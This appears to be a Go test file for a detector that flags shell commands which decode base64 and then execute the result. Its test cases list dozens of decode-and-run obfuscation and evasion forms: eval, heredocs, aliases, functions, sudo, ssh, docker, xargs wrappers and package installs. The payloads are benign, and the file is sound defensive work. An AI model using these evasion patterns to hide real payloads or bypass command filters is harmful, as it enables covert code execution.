package shelldecode

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// 修正轮 4 评审列出的「解码又执行」写法：不论两者怎样连接，都判为既解码又执行。
// 载荷都是无害的 aWQ=（id）或 ZWNobyBoaQ==（echo hi）。
func TestDecodeAndExecuteForms(t *testing.T) {
	cases := []string{
		"echo aWQ= | base64 -d | sh",
		"echo aWQ= | base64 --decode | bash",
		"echo aWQ= | base64 -D | zsh",
		"(echo aWQ= | base64 -d) | sh",
		"{ echo aWQ= | base64 -d; } | sh",
		"echo aWQ= | (base64 -d) | sh",
		`x=$(echo aWQ= | base64 -d); sh -c "$x"`,
		`x=$(echo aWQ= | base64 -d); eval "$x"`,
		`x=$(echo aWQ= | base64 -d); $x`,
		`env FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
		`sudo FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
		"timeout 5 sh -c 'echo aWQ= | base64 -d | sh'",
		"docker exec c sh -c 'echo aWQ= | base64 -d | sh'",
		"kubectl exec p -- sh -c 'echo aWQ= | base64 -d | sh'",
		"ssh host 'echo aWQ= | base64 -d | sh'",
		"su -c 'echo aWQ= | base64 -d | sh'",
		"if true; then bash -c 'echo aWQ= | base64 -d | sh'; fi",
		"sh <<'EOF'\necho aWQ= | base64 -d | sh\nEOF",
		"sh <<EOF\nx=$(echo aWQ= | base64 -d)\n$x\nEOF",
		"bash -s <<< 'echo aWQ= | base64 -d | sh'",
		"echo 'echo aWQ= | base64 -d | sh' | sh",
		"echo aWQ= | base64 -d 2>/dev/null > a.sh; sh a.sh",
		`echo aWQ= | base64 -d > a.sh; sh "$PWD/a.sh"`,
		"echo aWQ= | base64 -d > a.sh; cp a.sh b.sh; sh b.sh",
		`echo aWQ= | base64 -d > a.sh; find . -name a.sh -exec sh {} \;`,
		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; PATH=.:$PATH a.sh",
		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; ./a.sh",
		"echo aWQ= | base64 -d > /tmp/a.sh; /tmp/a.sh",
		"echo aWQ= | openssl base64 -d | sh",
		"echo aWQ= | openssl enc -d -a | sh",
		"echo aWQ= | busybox base64 -d | sh",
		"echo NFSQ==== | base32 -d | sh",
		"echo dnE= | base64 -d | tr a-z n-za-m > a.sh; sh a.sh",
		`eval "$(echo YVdRPQ== | base64 -d | base64 -d)"`,
		"bash <(echo aWQ= | base64 -d)",
		"source <(echo aWQ= | base64 -d)",
		". <(echo aWQ= | base64 -d)",
		`python3 -c "$(echo aWQ= | base64 -d)"`,
		"echo aWQ= | base64 -d | xargs -I{} sh -c {}",
		"echo aWQ= | base64 -d | /bin/sh",
		"echo aWQ= | ba''se64 -d | s\\h",
		"ssh h \"bash -c \\\"echo aWQ= | base64 -d | sh\\\"\"",
		// 双引号里的 \\ 由外层 shell 去掉一层，里层 shell 再把 base\64 读成 base64；词里有变量时也一样
		`sh -c "$x echo aWQ= | base\\64 -d | sh"`,
		// $'…' 里的转义按 bash 解开：\x62 是 b
		`sh -c $'echo aWQ= | \x62ase64 -d | sh'`,
		`echo aWQ= | $'\x62ase64' -d | sh`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 命令名无法静态确定（变量、命令替换、花括号展开、通配、同一命令里定义的函数）时视同可能是
// 解码，命令里又执行代码就判为既解码又执行（决定 24）。在 bash -c、$(…) 里同样如此。
func TestDynamicCommandNameWithExecution(t *testing.T) {
	cases := []string{
		"b=base64; echo aWQ= | $b -d | sh",
		"echo aWQ= | ${b} -d | sh",
		`b="base64 -d"; echo aWQ= | $b | sh`,
		"echo aWQ= | $(echo base64) -d | sh",
		"echo aWQ= | `echo base64` -d | sh",
		"echo aWQ= | {ba,}se64 -d | sh",
		"echo aWQ= | bas?64 -d | sh",
		"echo aWQ= | base* -d | sh",
		"echo aWQ= | command ba[s]e64 -d | sh", // 在命令名位置时解析器把 ba[s]e64 当成数组赋值，解析不了
		"echo aWQ= | sudo $b -d | sh",
		"f(){ base64 -d; }; echo aWQ= | f | sh",
		"f(){ $1 -d; }; echo aWQ= | f base64 | sh",
		`f(){ base64 "$@"; }; echo aWQ= | f -d | sh`,
		`g(){ f -d; }; f(){ base64 "$@"; }; echo aWQ= | g | sh`,
		`function f { base64 "$@"; }; echo aWQ= | f -d | sh`,
		"bash -c 'b=base64; echo aWQ= | $b -d | sh'",
		"bash -c 'echo aWQ= | ${b} -d | sh'",
		"bash -c 'echo aWQ= | {ba,}se64 -d | sh'",
		"bash -c 'echo aWQ= | bas?64 -d | sh'",
		"bash -c 'f(){ base64 -d; }; echo aWQ= | f | sh'",
		"bash -c 'f(){ $1 -d; }; echo aWQ= | f base64 | sh'",
		`bash -c 'f(){ base64 "$@"; }; echo aWQ= | f -d | sh'`,
		`b=base64; bash -c "echo aWQ= | $b -d | sh"`,
		`sh -c "$(echo aWQ= | $b -d)"`,
		`sh -c "$(echo aWQ= | {ba,}se64 -d)"`,
		`eval "$(echo aWQ= | bas?64 -d)"`,
		`x=$(echo aWQ= | ${b} -d); sh -c "$x"`,
		`f(){ $1 -d; }; sh -c "$(echo aWQ= | f base64)"`,
		// 交给 shell 执行的脚本文本里，命令名的位置上的变量同样无法静态确定，不论带不带解码选项
		"bash -c 'echo aWQ= | $b | sh'",
		"ssh h 'echo aWQ= | ${b} | sh'",
		"docker exec c sh -c 'echo aWQ= | $b | sh'",
		"sh <<'E'\necho aWQ= | $b | sh\nE",
		"bash <<< 'echo aWQ= | $b | sh'",
		"echo 'echo aWQ= | $b | sh' | sh",
		// 同一命令里定义的别名和函数一样，命令名指向的是别名的内容
		"alias b=base64\necho aWQ= | b -d | sh",
		"alias b='base64 -d'; echo aWQ= | b | sh",
		"bash -c 'alias b=base64; echo aWQ= | b -d | sh'",
		// 解码出的文本落在命令名的位置上同样会被执行
		"$(echo aWQ= | base64 -d)",
		// eval、source 在当前 shell 里执行，其中定义的函数、别名在外层调用
		`eval 'f(){ base64 "$@"; }'; echo aWQ= | f -d | sh`,
		`source <(echo 'f(){ base64 "$@"; }'); echo aWQ= | f -d | sh`,
		"eval 'alias b=base64'; echo aWQ= | b -d | sh",
		"command alias b=base64; echo aWQ= | b -d | sh",
		// exec、xargs、busybox、chroot、find -exec 之后的词同样是命令名
		"echo aWQ= | exec $b -d | sh",
		"echo f | xargs -n 1 $b -d | sh",
		`find . -name f -exec $b -d {} \; | sh`,
		"echo aWQ= | busybox $b -d | sh",
		"echo aWQ= | chroot / $b -d | sh",
		// eval 与 ssh 把参数用空格连成一段脚本再执行
		"echo aWQ= | eval $b -d | sh",
		"echo aWQ= | ssh -p 22 h $b -d | sh",
		// 管道送进 shell 的输出来自子 shell、花括号块或中间的过滤命令
		"(echo 'echo aWQ= | $b | sh') | sh",
		"{ echo 'echo aWQ= | $b | sh'; } | sh",
		"echo 'echo aWQ= | $b | sh' | cat | sh",
		"cat <<'E' | tee /dev/null | sh\necho aWQ= | $b | sh\nE",
		// ssh 的远端命令是从标准输入读脚本的 shell
		"ssh h 'bash -s' <<'E'\necho aWQ= | $b | sh\nE",
		"cat <<'E' | ssh -p 22 h sudo sh\necho aWQ= | $b | sh\nE",
		"echo 'echo aWQ= | $b | sh' | ssh h",
		// trap 的参数在当前 shell 里执行
		"trap 'echo aWQ= | $b | sh' EXIT",
		"echo aWQ= | {a,{ba,}se64} -d | sh",
		// sg、script 与 sudo -s、flock -c 运行 shell：交给它们的命令与标准输入是脚本文本
		"sg wheel -c 'echo aWQ= | $b | sh'",
		"script -qc 'echo aWQ= | $b | sh' /dev/null",
		"echo 'echo aWQ= | $b | sh' | script -q /dev/null",
		"sudo -s 'echo aWQ= | $b | sh'",
		"flock /tmp/l -c 'echo aWQ= | $b | sh'",
		"echo 'echo aWQ= | $b | sh' | sudo -s",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 命令名动态但不执行代码的命令照常送审；引号里的数据（awk 程序、jq 过滤、crontab 行）不当作
// 命令名动态的脚本。
func TestDynamicCommandNameWithoutExecution(t *testing.T) {
	cases := []string{
		"$EDITOR file",
		"$PAGER log.txt",
		"${KUBECTL:-kubectl} get pods",
		"awk '$3 > 100 {print $1}' data.txt",
		"kubectl get pods -o json | jq -r '.items[] | .metadata.name' | xargs -n1 echo",
		"echo '*/5 * * * * /usr/local/bin/backup' | crontab -",
		"[ -f a.sh ] && sh a.sh",
		// 交给 shell 的脚本里，awk 程序仍是数据
		`bash -c "awk '\$3 > 100 {print \$1}' data.txt"`,
		`ssh h "ps aux | awk '\$3 > 50 {print \$2}'"`,
		"alias ll='ls -l'; ll",
		`find . -name '*.log' -exec rm {} \;`,
		// 管道送进 shell 的是 awk、jq 的输出，不是它们的程序
		`kubectl get pods --no-headers | awk '$3=="Evicted" {print "kubectl delete pod " $1}' | sh`,
		`kubectl get pods -o json | jq -r '.items[] | "kubectl delete pod \(.metadata.name)"' | sh`,
		// ssh、sh -c 带着命令时，标准输入是给命令的数据，不是脚本
		`echo "$(hostname) $(uptime)" | ssh log@h 'cat >> /tmp/up'`,
		"ssh h 'cat > /tmp/run.sh' <<'EOF'\n$PY -m http.server\nEOF",
		"sh -c 'cat > /tmp/env' <<EOF\n$KEY=$VALUE\nEOF",
		// eval 整段脚本都在一个变量里时，没有可以单独看的命令名
		`eval "$(ssh-agent -s)"; ssh-add ~/.ssh/id_rsa`,
		`docker ps --format '{{.Names}},{{.Status}}' | xargs -n1 echo`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 修正轮 5 代码评审列出的误判（修正轮 6）：包装启动的选项与参数不是命令名，作为参数出现的名字
// 不是在运行该程序，同一命令里定义的函数按内容判断，路径命令名只有目录动态时按最后一段判断，
// find -exec 运行的是解码器时只算解码。这些命令照常送审。
func TestRevision6FalsePositivesAreReviewed(t *testing.T) {
	cases := []string{
		`log(){ echo "$@"; }; log start; ls; log done`,
		`env FOO=$BAR python3 app.py`,
		`timeout $T bash -c 'ls'`,
		`systemctl restart ssh && $EDITOR /etc/ssh/sshd_config`,
		`find . -name '*.b64' -exec base64 -d {} \;`,
		`sudo -u $U systemctl restart nginx`,
		`nice -n $N tar czf a.tgz dir`,
		`chroot $ROOT ls /etc`,
		`run(){ "$@"; }; run ls; run df -h`,
		`command -v sh >/dev/null && echo aGk= | base64 -d`,
		`which python3 >/dev/null && echo aGk= | base64 -d`,
		// 服务名不是 shell 或解释器的名字，不当作可能在运行
		`echo aGk= | base64 -d; systemctl restart ssh`,
		`echo aGk= | base64 -d; echo bash`,
		// 同一命令里定义的函数按内容判断：它只打印参数
		`log(){ echo "$@"; }; log bash; echo aGk= | base64 -d`,
		// xargs 不带程序时运行的是 echo
		"echo aWQ= | base64 -d | xargs",
		// 解释器代码里只有编码、没有解码
		`python3 -c 'import base64;print(base64.b64encode(b"x"))'`,
		`node -e "console.log(Buffer.from('hi').toString('base64'))"`,
		// 合在一起的短选项（-Eu、-nu）里带值的选项同样跳过它的值
		`sudo -Eu $U systemctl restart nginx`,
		`sudo -nu $U systemctl restart nginx`,
		// 调用时带上的词接在别名、函数的内容之后，照内容运行的程序判断
		`alias s=sudo; s systemctl restart nginx; $EDITOR /etc/nginx/nginx.conf`,
		`py(){ python3 "$@"; }; py app.py`,
		// 内容里无法静态确定的命令名在内容所在的地方算过一次，调用时不再算
		`alias e='$EDITOR'; e a.conf; e b.conf`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 包装启动按它实际运行的程序判断（修正轮 6）：运行 shell、解释器或无法静态确定的程序算执行代码，
// 运行解码器算解码；watch、parallel 把参数拼成脚本交给 shell。修正轮 5 代码评审列出的缺口都不送审。
func TestWrappersAreJudgedByTheProgramTheyRun(t *testing.T) {
	cases := []string{
		`exec "$SHELL" -l`,
		`watch -n1 'echo aWQ= | base64 -d | sh'`,
		`watch -n1 echo aWQ= '|' base64 -d '|' sh`,
		`echo aWQ= | watch -n 1 $b -d | sh`,
		`parallel ::: 'echo aWQ= | base64 -d | sh'`,
		`parallel ::: 'echo aWQ= > f' 'base64 -d f > a' 'sh a'`,
		`parallel echo aWQ= '|' base64 -d '|' sh ::: x`,
		`parallel -j 2 $b -d ::: f | sh`,
		`echo 'echo aWQ= | base64 -d | sh' | parallel`,
		`runuser -u x -- sh -c 'echo aWQ= | base64 -d | sh'`,
		`echo aWQ= | runuser -u x -- $b -d | sh`,
		`echo aWQ= | base64 -d | runuser -l x`,
		`systemd-run --wait sh -c 'echo aWQ= | base64 -d | sh'`,
		`echo aWQ= | systemd-run --wait -p User=x --unit u $b -d | sh`,
		`echo aWQ= | base64 -d | sudo -s`,
		`echo aWQ= | base64 -d | sudo -u $U bash`,
		`echo aWQ= | base64 -d | timeout $T nice -n $N sh`,
		`echo aWQ= | base64 -d > a; chroot $ROOT sh a`,
		`echo aWQ= | base64 -d | /usr/bin/env -u X sh`,
		`find . -name f -exec base64 -d {} \; -exec sh {} \;`,
		`echo aWQ= | busybox base64 -d | busybox sh`,
		`echo aWQ= | base64 -d | kubectl exec -i p -c c -- python3`,
		// kubectl exec 的 -- 之后是要运行的程序，无法静态确定时同样算（修正轮 6 代码评审）
		`echo aWQ= | kubectl exec -i p -- $b | sh`,
		`echo aWQ= | base64 -d | env -S sh`,
		// 不认识的程序带着 shell、解释器的名字作参数时，可能就是在运行它（包装启动的表不是封闭的）
		`echo aWQ= | base64 -d | tmux new sh`,
		`echo aWQ= | base64 -d | screen -dm python3`,
		`alias s=sudo; echo aWQ= | base64 -d | s sh`,
		// 同一命令里定义的函数、别名按内容判断：内容是解码时就是解码
		`f(){ base64 -d; }; echo aWQ= | f | sh`,
		`alias d='base64 -d'; echo aWQ= | d | sh`,
		`alias s=sh; echo aWQ= | base64 -d | s`,
		`r(){ command bash "$@"; }; echo aWQ= | base64 -d | r`,
		// 子 shell 里定义的同名函数不影响外层运行的 sh
		`bash -c 'sh(){ :; }'; echo aWQ= | base64 -d | sh`,
		// 路径命令名只有目录动态时按最后一段的字面名判断
		`$DIR/base64 -d | sh`,
		`"$DIR"/base64 -d | sh`,
		`echo aWQ= | ${D}/bin/base64 -d | sh`,
		`echo aWQ= | base64 -d | $BIN/sh`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 别名、函数按内容判断时，调用时带上的词与标准输入会流进内容（修正轮 6 代码评审）：别名的内容是
// 包装时它们是包装运行的命令，内容是 eval、shell、ssh 时它们是脚本，函数体把 "$@" 交给 eval、
// sh -c 时同样是脚本，内容从标准输入读脚本时送进调用的输入是脚本。这些都不送审。
func TestDefinitionsRunWhatTheCallerPasses(t *testing.T) {
	cases := []string{
		"alias s=sudo; echo aWQ= | s $b -d | sh",
		"alias s=sudo; echo aWQ= | s $b | sh",
		"alias x=xargs; echo aWQ= | x $b | sh",
		"alias a=s; alias s=sudo; echo aWQ= | a $b | sh",
		"alias k=kubectl; echo aWQ= | k exec -i p -- $b | sh",
		"alias n=; echo aWQ= | n $b | sh",
		"alias n='true;'; echo aWQ= | n $b | sh",
		"alias e=eval; echo aWQ= | e '$b' | sh",
		`f(){ eval "$@"; }; echo aWQ= | f '$b' | sh`,
		`f(){ sh -c "$1"; }; f 'echo aWQ= | $b | sh'`,
		`f(){ sh; }; echo 'echo aWQ= | $b | sh' | f`,
		`g(){ f; }; f(){ sh; }; echo 'echo aWQ= | $b | sh' | g`,
		"alias s=sh; echo 'echo aWQ= | $b | sh' | s",
		`alias py=python3; py -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`py(){ python3 "$@"; }; py -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`alias py=python3; echo 'import base64,os;os.system(base64.b64decode("aWQ=").decode())' | py`,
		`run(){ "$@"; }; echo aWQ= | run eval '$b'`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 修正轮 6 代码评审留下的缺口（修正轮 7，决定 25、26）：路径命令名的动态部分没有引号时 shell 会按空白
// 拆开它，按命令名无法静态确定处理；不在「不运行参数的程序」表里的程序带着同一命令里写入的文件作参数
// 算在运行它；容器 exec / run 没有 -- 时子命令之后的动态词按命令名无法静态确定处理；别名展开成包装、
// 函数体的位置参数按调用处代入后，交给 shell 的参数同样是脚本。这些都不送审。
func TestRevision7GapsAreRefused(t *testing.T) {
	cases := []string{
		"echo aWQ= | $X/dev/stdin | sh",
		`ssh host '$HOME/bin/tool --restart'`,
		"echo aWQ= | base64 -d > a.sh; tmux new ./a.sh",
		"echo aWQ= | base64 -d | tee a.sh; tmux new ./a.sh",
		"echo aWQ= | base64 -d -o a.sh; screen -dm a.sh",
		"echo aWQ= | docker exec -i c $b | sh",
		"echo aWQ= | podman exec c $b | sh",
		"echo aWQ= | nerdctl run --rm img $b | sh",
		"echo aWQ= | kubectl exec -i p $b | sh",
		"echo aWQ= | docker exec -i $c sh",
		"alias s=sudo; s -s 'echo aWQ= | $b | sh'",
		// 展开后从标准输入读脚本，送进来的输入在调用处没当作脚本看过
		"alias s=sudo; echo 'echo aWQ= | $b | sh' | s -s",
		`f(){ $1; }; f 'sudo -s' <<< 'echo aWQ= | $b | sh'`,
		`f(){ sudo "$@"; }; echo aWQ= | f $b | sh`,
		`f(){ "$@"; }; f sudo -s 'echo aWQ= | $b | sh'`,
		`f(){ $1; }; echo aWQ= | f '$b -d' | sh`,
		`f(){ sudo "$@" -d; }; echo aWQ= | f base64 | sh`,
		`f(){ shift; sh -c "$1"; }; f x 'echo aWQ= | $b | sh'`,
		// 带有会运行命令的选项时，表里的程序也不算不运行参数
		"echo aGk= | base64 -d; git -c core.pager=sh log",
		"echo aGk= | base64 -d; git rebase --exec sh main",
		"echo aGk= | base64 -d; apt-get -o APT::Update::Pre-Invoke::=sh update",
		// 表里的程序的参数里的解码照样算：写进脚本再运行
		"echo 'echo aWQ= | base64 -d' > a.sh; sh a.sh",
		// 字面的路径是在执行那个文件，不看它叫什么：按最后一段判断只给动态部分在双引号里或是 ~ 的路径
		"echo aWQ= | base64 -d > ls; chmod +x ls; ./ls",
		"echo aWQ= | base64 -d > /tmp/cat; chmod +x /tmp/cat; /tmp/cat",
		"echo aWQ= | base64 -d > base64; chmod +x base64; echo aGk= | ./base64 -d",
		`/usr/bin/base64 -d f > out.bin`,
		// 函数体把位置参数送进 shell、解释器的标准输入：代入后调用处的词是脚本、代码
		`f(){ echo "$1" | sh; }; f '$b aWQ= | $c'`,
		`f(){ echo "$@" | sudo bash; }; f '$b aWQ= | $c'`,
		`f(){ { printf '%s\n' "$1"; } | sh; }; f '$b aWQ= | $c'`,
		`f(){ echo "$1" | python3; }; f 'exec(__import__("base64").b64decode("aWQ="))'`,
		`f(){ python3 <<< "$1"; }; f 'exec(__import__("base64").b64decode("aWQ="))'`,
		`f(){ sh <<< "$2"; }; f x '$b aWQ= | $c'`,
		// 展开后同一个词既落在表里的程序上、又落在别处时按别处算
		`f(){ echo "$1"; tmux new "$1"; }; f 'bash now'; echo aGk= | base64 -d`,
		`f(){ for x in "$@"; do tmux new "$x"; done; echo "$@"; }; f 'bash now'; echo aGk= | base64 -d`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 修正轮 6 代码评审列出的误判（修正轮 7，决定 25、26）：「不运行参数的程序」表里的程序的参数与其中的
// 引号文本不当作在运行 shell、解释器或路径；函数体的位置参数按调用处代入；动态部分在双引号里或是 ~ 的
// 路径命令名仍按最后一段判断；容器 exec 没有 -- 时的动态词只是动态命令名。这些照常送审。
func TestRevision7FalsePositivesAreReviewed(t *testing.T) {
	cases := []string{
		`kubectl get secret s -o jsonpath='{.data.p}' | base64 -d; echo "use bash now"`,
		`kubectl get secret s -o jsonpath='{.data.p}' | base64 -d; ps aux | grep python`,
		`$EDITOR f; ps aux | grep python`,
		`$EDITOR f; git commit -m "bump python"`,
		`echo aGk= | base64 -d; apt install -y python3`,
		`echo aGk= | base64 -d > a.sh; chmod +x a.sh`,
		`echo aGk= | base64 -d > out.bin; sha256sum out.bin; rm out.bin`,
		`echo aGk= > a.b64; base64 -d a.b64`,
		`echo aGk= | base64 -d; git log --oneline | grep python`,
		`f(){ sudo "$@"; }; f ls`,
		`f(){ sh -c "$1"; }; f 'ls -l'`,
		`"$DIR"/base64 -d > out.bin`,
		`ssh host '~/bin/tool --restart'`,
		`ssh host '"$HOME"/bin/tool --restart'`,
		`~/bin/base64 -d f > out.bin`,
		`echo aGk= | base64 -d; "$DIR"/ls`,
		// 调用同一命令里的函数、别名按展开后判断：落在表里程序的参数上的引号文本同样不算在运行
		`log(){ echo "$@"; }; log "installing python"; echo aGk= | base64 -d`,
		`alias g='git commit -m'; g "bump python"; echo aGk= | base64 -d`,
		`f(){ echo "$1" | sh; }; f 'ls -l'`,
		`f(){ echo "$1" | python3; }; f 'print(1)'`,
		`f(){ python3 <<< "$1"; }; f 'print(1)'`,
		`f(){ sh <<< "$1"; }; f 'ls -l'`,
		`log(){ echo "[$(date)] $*"; }; log "installing python"; echo aGk= | base64 -d`,
		`g(){ log "$@"; }; log(){ echo "$@"; }; g "use bash"; echo aGk= | base64 -d`,
		`docker exec $c ls`,
		`echo aGk= | base64 -d; docker run -e FOO=$BAR --name=$N img ls`,
		`echo aGk= | base64 -d; kubectl exec $p -- ls`,
		`echo aGk= | base64 -d; dpkg -l | grep python`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 修正轮 7 代码评审留下的缺口：函数体里命令替换中的位置参数不让别处的位置参数被当作已代入；函数、
// 别名的输出送进 shell、解释器时，落在 echo 等参数上的调用处的词是脚本、代码；docker 的 -- 之后是
// 容器名；包管理安装本地的包文件会运行包里的脚本。这些都不送审。
func TestRevision7CodeReviewGapsAreRefused(t *testing.T) {
	cases := []string{
		`f(){ echo "$(cat "$1")"; tmux new "$1 x"; }; f 'bash now'; echo aGk= | base64 -d`,
		`f(){ echo "$1"; }; f 'echo aWQ= | $b | sh' | sh`,
		`f(){ printf '%s\n' "$@"; }; f 'echo aWQ= | $b | sh' | bash`,
		`alias p=echo; p 'echo aWQ= | $b | sh' | sh`,
		`f(){ echo "$1"; }; f 'exec(__import__("base64").b64decode("aWQ="))' | python3`,
		`echo aWQ= | docker exec -i -- c $b | sh`,
		`echo aWQ= | docker run --rm -- img $b | sh`,
		`echo aWQ= | docker exec -i -u root -- c $b | sh`,
		`echo aGk= | base64 -d > a.deb; apt install -y ./a.deb`,
		`echo aGk= | base64 -d > a.rpm; yum install -y ./a.rpm`,
		`echo aGk= | base64 -d > a.apk; apk add --allow-untrusted a.apk`,
		`echo aGk= | base64 -d > a.tar.gz; pip install a.tar.gz`,
		`echo aGk= | base64 -d > a.rb; brew install ./a.rb`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
	reviewed := []string{
		`f(){ echo "$1"; }; f 'ls -l' | sh`,
		`alias p=echo; p 'use bash now'; echo aGk= | base64 -d`,
		`f(){ echo "$(cat "$1")"; }; f 'bash now'; echo aGk= | base64 -d`,
		`docker exec -i -- c ls`,
		`echo aGk= | base64 -d; yum install -y /tmp/x.rpm`,
		`echo aGk= | base64 -d; apt install -y python3.11`,
	}
	for _, cmd := range reviewed {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 修正轮 8（决定 28）：表里程序的输出经命令替换成为别的命令的词、或经管道交给 xargs、parallel 时，它的
// 参数按接收处判断；函数、别名的调用输出送进 shell、解释器时，调用处的词按脚本、代码判断，不看函数体
// 怎样打印；安装命令装同一命令里写入的文件或包含它的目录算在运行它。这些都不送审。
func TestRevision8OutputLandsWhereItIsUsed(t *testing.T) {
	cases := []string{
		`tmux new "$(echo 'bash now')"; echo aGk= | base64 -d`,
		"tmux new `echo bash`; echo aGk= | base64 -d",
		`echo 'bash now' | xargs tmux new; echo aGk= | base64 -d`,
		`printf 'bash\n' | parallel tmux new; echo aGk= | base64 -d`,
		`f(){ tmux new "$(echo "$1")"; }; f 'bash now'; echo aGk= | base64 -d`,
		`f(){ echo "$1" | xargs tmux new; }; f 'bash now'; echo aGk= | base64 -d`,
		`f(){ echo "$1"; }; f 'bash now' | xargs tmux new; echo aGk= | base64 -d`,
		`f(){ cat <<< "$1"; }; f 'echo aWQ= | $b | sh' | sh`,
		"f(){ cat <<EOF\n$1\nEOF\n}; f 'echo aWQ= | $b | sh' | sh",
		`alias p='cat <<<'; p 'exec(__import__("base64").b64decode("aWQ="))' | python3`,
		`f(){ cat <<< "$1"; }; f 'exec(__import__("base64").b64decode("aWQ="))' | python3`,
		`f(){ printf '%s' "$1"; }; f 'exec(__import__("base64").b64decode("aWQ="))' | python3`,
		`echo aWQ= | base64 -d > d/setup.py; pip install ./d`,
		`echo aWQ= | base64 -d > pkg; dpkg -i pkg`,
		`echo aWQ= | base64 -d > pkg.bin; apt install ./pkg.bin`,
		// 接收处按拆开后的参数判断：xargs 按空白拆开输出，tmux new "x bash" 本身也不送审
		`tmux new "$(echo 'x bash')"; echo aGk= | base64 -d`,
		`echo 'x bash' | xargs tmux new; echo aGk= | base64 -d`,
		`printf 'x\nbash\n' | xargs tmux new; echo aGk= | base64 -d`,
		// 表里程序的输出又成为表里程序的词、再到接收处
		`tmux new "$(echo "$(echo bash)")"; echo aGk= | base64 -d`,
		// 包装链里的 xargs 同样把标准输入当参数
		`echo bash | sudo xargs tmux new; echo aGk= | base64 -d`,
		`echo bash | timeout 5 xargs tmux new; echo aGk= | base64 -d`,
		// 当前目录、不带 / 的目录与文件同样是写入的文件或包含它的目录
		`echo aWQ= | base64 -d > setup.py; pip install .`,
		`echo aWQ= | base64 -d > setup.py; pip install -e .`,
		`echo aWQ= | base64 -d > d/setup.py; pip install d`,
		`echo aWQ= | base64 -d > req.txt; pip install -r req.txt`,
		`echo aWQ= | base64 -d > d/setup.py; pip install "$PWD"/d`,
		`echo aWQ= | base64 -d > d/package.json; npm install ./d`,
		`f(){ tmux new "$1"; }; f "$(echo bash)"; echo aGk= | base64 -d`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
	reviewed := []string{
		`grep "$(echo python)" f; echo aGk= | base64 -d`,
		`echo python | xargs grep -l; echo aGk= | base64 -d`,
		`f(){ cat <<< "$1"; }; f 'ls -l' | sh`,
		`pip install requests; echo aGk= | base64 -d`,
		`apt install -y python3; echo aGk= | base64 -d`,
		`echo aGk= | base64 -d > out.txt; cat out.txt`,
		// 接收处是只把参数交给表里程序的函数、别名：和 log python 一样不算在运行
		`log(){ echo "$@"; }; log "$(echo python)"; echo aGk= | base64 -d`,
		`alias l='echo'; l "$(echo python)"; echo aGk= | base64 -d`,
		// 输出里的字面 $_ 不是占位
		`tmux new "$(echo '$_')"; echo aGk= | base64 -d`,
		`echo '$_' | xargs tmux new; echo aGk= | base64 -d`,
	}
	for _, cmd := range reviewed {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 修正轮 8 代码评审：串起来的 xargs 链里各段的输出到紧接着的接收处；只把参数交给表里程序的函数、别名
// 自己的输出又成为别的命令的参数时，接收处是那个命令；printf、echo 解开的各种转义（\012、\x0a、
// echo 的 \0NNN、dash 的 echo 不带 -e 也解）与 NUL 同样分开参数；输出所在的词有动态部分时字面部分照样
// 按接收处判断；heredoc、here-string 经表里程序输出同样算；安装命令合在短选项里的值（-rreq.txt、-e.）
// 同样认得出。
func TestRevision8CodeReviewGapsAreRefused(t *testing.T) {
	cases := []string{
		`echo bash | xargs tmux new | xargs base64 -d`,
		`echo bash | xargs tmux new | xargs docker exec -i c; echo aGk= | base64 -d`,
		`log(){ echo "$@"; }; tmux new "$(log "$(echo bash)")"; echo aGk= | base64 -d`,
		`alias l=echo; tmux new "$(l "$(echo bash)")"; echo aGk= | base64 -d`,
		`printf 'x\012bash' | xargs tmux new; echo aGk= | base64 -d`,
		`printf 'x\x0abash' | xargs tmux new; echo aGk= | base64 -d`,
		`echo -e 'x\0012bash' | xargs tmux new; echo aGk= | base64 -d`,
		`echo 'x\nbash' | xargs tmux new; echo aGk= | base64 -d`,
		`printf 'x\0bash' | xargs -0 tmux new; echo aGk= | base64 -d`,
		`tmux new "$(echo "bash $y")"; echo aGk= | base64 -d`,
		`echo "bash $y" | xargs tmux new; echo aGk= | base64 -d`,
		`tmux new "$(cat <<< bash)"; echo aGk= | base64 -d`,
		"cat <<EOF | xargs tmux new; echo aGk= | base64 -d\nbash\nEOF",
		`echo aWQ= | base64 -d > req.txt; pip install -rreq.txt`,
